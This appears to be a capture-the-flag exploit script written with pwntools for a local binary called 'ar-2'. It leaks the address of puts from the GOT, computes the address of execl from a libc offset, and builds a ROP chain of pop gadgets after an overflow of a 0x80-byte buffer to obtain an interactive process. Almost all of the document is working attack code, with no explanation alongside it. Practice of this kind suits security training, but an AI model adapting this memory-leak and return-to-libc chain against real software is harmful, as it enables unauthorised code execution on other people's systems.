#!/usr/bin/env python

from pwn import *

p = process("./ar-2")


got_of_puts = p.elf.got['puts']
print("Got of puts %s" % hex(got_of_puts))


'''
0x0000000000400a2c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400a2e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400a30 : pop r14 ; pop r15 ; ret
0x0000000000400a32 : pop r15 ; ret
0x0000000000400822 : pop rbp ; mov byte ptr [rip + 0x20086e], 1 ; ret
0x00000000004007af : pop rbp ; mov edi, 0x601080 ; jmp rax
0x0000000000400a2b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400a2f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004007c0 : pop rbp ; ret
0x00000000004009cb : pop rbx ; pop rbp ; ret
0x0000000000400a33 : pop rdi ; ret
0x0000000000400a31 : pop rsi ; pop r15 ; ret
0x0000000000400a2d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
'''

p.sendline("8")
print(p.recv())
p.sendline(hex(got_of_puts))
inputs = p.recv()
print(str(inputs[30:38]))
inputs = u64(inputs[30:38])
print("inputs: " + hex(inputs))


'''
pwndbg> print execl
$3 = {<text variable, no debug info>} 0x7fce330e9a20 <__GI_execl>
pwndbg> print puts
$4 = {<text variable, no debug info>} 0x7fce3308c690 <_IO_puts>
'''

offset_between_execl_and_puts =0x7fce330e9a20 - 0x7fce3308c690
true =  inputs + offset_between_execl_and_puts
print("true: "+str(true))


pop_rdi = p64(0x0000000000400a33)
pop_rsi_r15 = p64(0x0000000000400a31)


buf = "A" * 0x80 + "AAAABBBB"


'''
0x400c4c:       "d"
'''



d = p64(0x400c4c)


buf += pop_rdi
buf += d
buf += pop_rsi_r15
buf += p64(0)
buf += p64(0)
buf += p64(true)



p.sendline(buf)

p.interactive()